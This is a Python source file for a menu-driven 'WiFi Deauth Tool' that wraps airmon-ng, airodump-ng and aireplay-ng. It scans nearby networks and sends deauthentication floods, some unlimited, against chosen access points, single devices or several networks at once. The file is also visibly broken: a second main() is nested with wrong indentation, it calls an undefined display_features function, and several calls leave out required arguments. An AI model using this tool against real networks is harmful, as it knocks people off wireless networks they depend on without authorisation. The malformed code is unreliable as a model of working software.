import os
import subprocess
import csv
from typing import List

def start_airmon() -> None:
    """Start airmon-ng"""
    try:
        subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error starting airmon-ng: {e}")

def stop_airmon() -> None:
    """Stop airmon-ng"""
    try:
        subprocess.run(["airmon-ng", "stop", "wlan0mon"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error stopping airmon-ng: {e}")

def get_interface_name() -> str:
    """Get the interface name"""
    try:
        output = subprocess.check_output(["airmon-ng"])
        interface_name = None
        for line in output.decode("utf-8").split("\n"):
            if "wlan0" in line:
                interface_name = line.split()[1]
                break
        if interface_name is None:
            print("Failed to get interface name")
            return ""
        return interface_name
    except subprocess.CalledProcessError as e:
        print(f"Error getting interface name: {e}")
        return ""

def scan_wifi(interface_name: str) -> list:
    """Scan for wireless networks and return a list of MAC addresses"""
    try:
        subprocess.run(["airodump-ng", "-w", "scan", "--output-format", "csv", interface_name], timeout=None, check=True)
        with open("scan-01.csv", "r") as f:
            reader = csv.reader(f)
            wifi_list = [row[13].strip() for row in reader][1:]  # Skip the header
        return wifi_list
    except subprocess.CalledProcessError as e:
        print(f"Error scanning for WiFi: {e}")
        return []
    except FileNotFoundError:
        print("Error: scan-01.csv file not found")
        return []
    except KeyboardInterrupt:
        print("\nScan cancelled. Returning to menu...")
        return []
    finally:
        # Remove the scan-01.csv file to avoid clutter
        try:
            os.remove("scan-01.csv")
        except FileNotFoundError:
            pass

def set_channel(channel: str) -> None:
    """Set the channel for the interface"""
    try:
        subprocess.run(["iwconfig", "wlan0mon", "channel", channel], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error setting channel: {e}")

def deauth_attack(mac_address):
    # Get the current interface name
    output = subprocess.check_output(["airmon-ng"])
    interface_name = None
    for line in output.decode("utf-8").split("\n"):
        if "wlan0" in line:
            interface_name = line.split()[1]
            break
    if interface_name is None:
        print("Failed to get interface name")
        return
    # Perform deauth attack
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
    except subprocess.CalledProcessError as e:
        print(f"Error deauthenticating device: {e}")
    except KeyboardInterrupt:
        print("\nDeauth attack cancelled. Returning to menu...")


def get_connected_devices(interface_name: str) -> List[str]:
    """Get a list of connected devices"""
    try:
        output = subprocess.check_output(["airodump-ng", "-w", "wlan0", "--output-format", "csv"])
        devices = [line.split(",")[0].strip() for line in output.decode("utf-8").split("\n") if "Station" in line]
        return devices
    except subprocess.CalledProcessError as e:
        print(f"Error getting connected devices: {e}")
        return []

def deauth_specific_device(mac: str, interface_name: str) -> None:
    """Deauthenticate a specific device"""
    try:
        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, interface_name], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error deauthenticating device: {e}")

def deauth_multiple_wifi(macs: List[str], interface_name: str) -> None:
    """Deauthenticate multiple WiFi networks"""
    for mac in macs:
        try:
            subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, interface_name], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error deauthenticating WiFi: {e}")

def clear_screen() -> None:
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header() -> None:
    """Display the tool header and owner information"""
    print("WiFi Deauth Tool")
    print("----------------")
    print("Owner: Junaid Bharwana")
    print("----------------")

def main() -> None:
    while True:
        
        print("1. Start airmon-ng")
        print("2. Stop airmon-ng")
        print("3. Get WiFi list")
        print("4. Set channel")
        print("5. Deauthenticate WiFi")
        print("6. Get connected devices")
        print("7. Deauthenticate specific device")
        print("8. Deauthenticate multiple WiFi")
        print("9. Exit")

    
        def main() -> None:
    while True:
        clear_screen()
        display_header()
        display_features()
        choice = input("Enter your choice: ")
        
        if choice == "1":
            start_airmon()
        elif choice == "2":
            stop_airmon()
        elif choice == "3":
            interface_name = get_interface_name()
            if interface_name:
                wifi_list = scan_wifi(interface_name)
                print("WiFi List:")
                for i, wifi in enumerate(wifi_list):
                    print(f"{i+1}. {wifi}")
        elif choice == "4":
            channel = input("Enter channel number: ")
            set_channel(channel)
  
        elif choice == "5":
            mac = input("Enter WiFi MAC address: ")
            deauth_attack(mac)
        elif choice == "6":
            devices = get_connected_devices()
            print("Connected Devices:")
            for i, device in enumerate(devices):
                print(f"{i+1}. {device}")
        elif choice == "7":
            mac = input("Enter device MAC address: ")
            deauth_specific_device(mac)
        elif choice == "8":
            macs = input("Enter multiple WiFi MAC addresses (separated by commas): ")
            macs = [mac.strip() for mac in macs.split(",")]
            deauth_multiple_wifi(macs)
        elif choice == "9":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
